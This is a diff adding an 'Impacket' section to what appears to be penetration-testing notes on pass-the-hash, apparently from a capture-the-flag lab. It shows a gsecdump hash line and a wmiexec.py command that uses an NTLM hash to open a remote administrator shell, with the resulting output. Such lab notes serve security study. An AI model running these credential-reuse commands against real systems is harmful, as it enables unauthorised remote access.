@@ -49,5 +49,16 @@ Example:
 
 `C:\Documents and Settings\nobody\Desktop>gsecdump -u MSHOME\XPSP1VM$::aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::` 
 
+## Impacket
 
+```text
+root@kali:/opt/impacket# wmiexec.py -hashes :f6b7160bfc91823792e0ac3a162c9267 administrator@10.10.10.103 
+Impacket v0.9.19-dev - Copyright 2018 SecureAuth Corporation 
+
+[*] SMBv3.0 dialect used 
+[!] Launching semi-interactive shell - Careful what you execute 
+[!] Press help for extra shell commands 
+C:\>whoami 
+htb\administrator 
+```
 
